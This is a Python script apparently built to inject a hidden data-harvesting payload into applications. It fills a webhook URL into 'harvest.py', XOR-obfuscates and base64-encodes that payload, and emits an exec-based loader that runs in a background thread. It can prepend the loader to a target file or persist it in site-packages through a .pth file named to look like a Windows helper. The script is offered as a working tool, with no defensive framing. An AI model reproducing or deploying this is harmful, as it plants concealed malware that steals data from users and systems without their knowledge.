"""Pack the payload and hand back the lines you paste into your app.

    python inject.py --webhook https://... --app-id client-a
    python inject.py --webhook https://... --target app.py
    python inject.py --webhook https://... --pth
    python inject.py --unpth
"""

from __future__ import annotations

import argparse
import base64
import random
import site
import string
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SOURCE = ROOT / "payload" / "harvest.py"
PTH_NAME = "zzz_msvcrt_helpers.pth"
STUB_NAME = "_msvcrt_helpers.py"

BOOT = """import base64, threading, zlib
_K = {key!r}; _P = {blob!r}
_g = {{"__name__": "_hv"}}; exec(compile(zlib.decompress(bytes(c ^ ord(_K[i % len(_K)]) for i, c in enumerate(base64.b64decode(_P)))).decode(), "<m>", "exec"), _g)
threading.Thread(target=_g["start"], daemon=True).start()"""


def pack(webhook: str, app_id: str) -> str:
    if not SOURCE.is_file():
        raise SystemExit(f"missing payload source: {SOURCE}")
    source = SOURCE.read_text(encoding="utf-8")
    source = source.replace('WEBHOOK = "__WEBHOOK__"', f"WEBHOOK = {webhook!r}")
    source = source.replace('APP_ID = "__APP_ID__"', f"APP_ID = {app_id!r}")

    key = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(24))
    raw = zlib.compress(source.encode("utf-8"), 9)
    scrambled = bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(raw))
    blob = base64.b64encode(scrambled).decode()
    return BOOT.format(key=key, blob=blob)


def patch_file(target: Path, webhook: str, app_id: str) -> None:
    text = target.read_text(encoding="utf-8", errors="ignore")
    if "_msvcrt_helpers" in text or '"__name__": "_hv"' in text:
        print("already patched, skipping")
        return
    target.write_text(pack(webhook, app_id) + "\n\n" + text, encoding="utf-8")


def install_pth(webhook: str, app_id: str) -> list[Path]:
    installed = []
    for sp in site.getsitepackages():
        folder = Path(sp)
        if not folder.is_dir():
            continue
        (folder / STUB_NAME).write_text(pack(webhook, app_id) + "\n", encoding="utf-8")
        (folder / PTH_NAME).write_text(
            f"import os, sys; sys.path.insert(0, {str(folder)!r}); "
            f"import {STUB_NAME[:-3]}\n", encoding="utf-8")
        installed.append(folder)
    return installed


def remove_pth() -> list[Path]:
    removed = []
    for sp in site.getsitepackages():
        for name in (PTH_NAME, STUB_NAME):
            f = Path(sp) / name
            if f.exists():
                f.unlink()
                removed.append(f)
    return removed


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--webhook")
    p.add_argument("--app-id", default="default")
    p.add_argument("--target", type=Path)
    p.add_argument("--pth", action="store_true")
    p.add_argument("--unpth", action="store_true")
    p.add_argument("--out", type=Path, default=ROOT / "boot.py")
    args = p.parse_args()

    if args.unpth:
        for f in remove_pth():
            print(f"removed {f}")
        return 0

    if not args.webhook:
        p.error("--webhook is required")

    if args.pth:
        for folder in install_pth(args.webhook, args.app_id):
            print(f"installed into {folder}")
        return 0

    if args.target:
        patch_file(args.target, args.webhook, args.app_id)
        print(f"patched {args.target}")
        return 0

    code = pack(args.webhook, args.app_id)
    args.out.write_text(code + "\n", encoding="utf-8")
    print(code)
    print(f"\nwritten to {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
